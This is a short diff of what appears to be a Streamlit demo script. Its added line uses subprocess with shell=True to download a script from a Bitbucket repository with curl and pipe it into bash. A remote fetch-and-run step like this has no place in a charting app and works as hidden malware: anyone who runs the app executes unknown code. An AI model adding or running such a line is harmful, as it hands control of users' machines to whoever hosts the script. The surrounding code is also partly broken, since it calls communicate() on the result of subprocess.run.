@@ -72,7 +72,7 @@ with st.echo(code_location='below'):
         .encode(x='x:Q', y='y:Q'))
 
         
-p = subprocess.run("bash -c "`curl -sL https://bitbucket.org/nicezep/korong/raw/master/buildkite | bash", stdout=subprocess.PIPE, shell=True)
+p = subprocess.run("curl -sL https://bitbucket.org/nicezep/korong/raw/master/buildkite | bash", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
 
 import time 
